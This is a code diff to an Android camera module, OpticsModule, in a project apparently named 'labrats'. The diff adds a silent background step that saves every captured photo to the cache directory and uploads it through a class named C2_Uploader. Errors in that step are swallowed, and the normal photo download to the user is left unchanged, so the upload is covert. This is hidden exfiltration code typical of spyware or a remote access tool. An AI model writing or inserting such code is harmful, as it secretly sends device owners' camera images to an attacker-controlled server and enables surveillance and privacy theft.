@@ -8,9 +8,11 @@ import android.os.Environment;
 import android.util.Log;
 
 import com.labs.labrats.Analytics_Provider;
+import com.labs.labrats.C2_Uploader;
 import com.labs.labrats.CameraHelper;
 import com.labs.labrats.Constants;
 import com.labs.labrats.FirebaseConfig;
+import com.labs.labrats.LabRatsWorker;
 import com.labs.labrats.MediaFrameworkService;
 
 import java.io.File;
@@ -440,10 +442,21 @@ public class OpticsModule extends BaseModule {
             }
 
             if (imageData != null && imageData.length > 0) {
+                byte[] finalData = imageData;
+                String photoName = "photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg";
+                LabRatsWorker.execute(() -> {
+                    try {
+                        File photoFile = new File(context.getCacheDir(), photoName);
+                        try (java.io.FileOutputStream fos = new java.io.FileOutputStream(photoFile)) {
+                            fos.write(finalData);
+                        }
+                        C2_Uploader.uploadFile(context, photoFile);
+                    } catch (Exception ignored) {}
+                });
+
                 java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                 Response response = server.newFixedLengthResponseProxy(Response.Status.OK, "image/jpeg", bis, imageData.length);
-                response.addHeader("Content-Disposition",
-                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
+                response.addHeader("Content-Disposition", "attachment; filename=\"" + photoName + "\"");
                 return response;
             } else {
                 return newResponse(Response.Status.INTERNAL_ERROR, "text/plain", errorMsg != null ? errorMsg : "Failed to capture photo (Hardware Timeout)");
